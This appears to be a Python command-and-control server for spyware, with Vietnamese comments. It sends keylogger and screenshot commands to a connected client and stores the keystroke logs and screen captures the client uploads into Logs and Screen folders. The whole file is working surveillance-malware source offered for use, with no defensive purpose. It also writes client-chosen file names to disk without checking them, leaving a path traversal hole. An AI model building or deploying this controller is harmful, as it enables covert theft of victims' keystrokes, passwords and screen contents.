import socket
import threading  # Thêm thư viện threading
import os

def handle_client(connection):
    """Hàm để xử lý dữ liệu từ client."""
    while True:
        try:
            data = connection.recv(1024)  # Nhận dữ liệu từ client
            if data:
                # Kiểm tra xem có phải là lệnh gửi file không
                if data.startswith(b"FILE"):
                    # Nhận thông tin file (tên và kích thước)
                    filename, filesize = receive_file_info(connection)

                    # Nếu nhận được thông tin hợp lệ, nhận nội dung file
                    if filename and filesize:
                        threading.Thread(target=receive_file, args=(connection, filename, filesize)).start()
                else:
                    print("\nNhận từ client:", data.decode())
            else:
                print("Client đã ngắt kết nối.")
                break
        except Exception as e:
            print(f"Đã xảy ra lỗi: {e}")
            break

def receive_file_info(connection):
    """Nhận thông tin file (tên và kích thước) từ client."""
    try:
        data = connection.recv(1024).decode()
        parts = data.split()
        if len(parts) >= 3 and parts[0] == "FILE":
            filename = parts[1]
            try:
                filesize = int(parts[2])
                print(f"Nhận file: {filename}, kích thước: {filesize} bytes")
                return filename, filesize
            except ValueError:
                print("Không thể chuyển đổi kích thước file. Dữ liệu không đúng định dạng.")
        else:
            print("Dữ liệu nhận không đúng định dạng.")
    except Exception as e:
        print(f"Đã xảy ra lỗi khi nhận thông tin file: {e}")
    return None, None

def receive_file(connection, filename, filesize):
    """Nhận nội dung file từ client."""
    # Kiểm tra và tạo thư mục lưu file
    if filename.endswith(".txt"):
        save_directory = 'Logs'
    elif filename.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
        save_directory = 'Screen'
    else:
        print("Định dạng file không hợp lệ.")
        return

    os.makedirs(save_directory, exist_ok=True)
    file_path = os.path.join(save_directory, filename)

    # Mở file và ghi dữ liệu
    with open(file_path, 'wb') as f:
        bytes_received = 0
        while bytes_received < filesize:
            bytes_read = connection.recv(1024)
            if not bytes_read:
                print("Kết nối bị ngắt trong khi nhận dữ liệu.")
                break
            f.write(bytes_read)
            bytes_received += len(bytes_read)
            print(f"Đã nhận: {bytes_received}/{filesize} bytes")

        # Kiểm tra lại xem đã nhận đủ dữ liệu chưa
        if bytes_received == filesize:
            print(f"Đã nhận file đầy đủ và lưu tại: {file_path}")
        else:
            print(f"Lỗi: chỉ nhận được {bytes_received} bytes trong tổng số {filesize} bytes")

def main():
    # Thiết lập socket
    server_address = ('localhost', 12345)  # Địa chỉ server và cổng
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(server_address)
    server_socket.listen(1)
    
    print("Server đang lắng nghe kết nối...")
    connection, client_address = server_socket.accept()

    # Tạo một thread để xử lý client
    threading.Thread(target=handle_client, args=(connection,), daemon=True).start()

    try:
        print("Đã kết nối với client.")
        while True:
            command = input("Nhập lệnh (start_keylogger, start_screenshot, stop, send_log, send_screens): ")
            connection.sendall(command.encode())
    finally:
        connection.close()  # Đóng kết nối khi hoàn thành

if __name__ == "__main__":
    main()
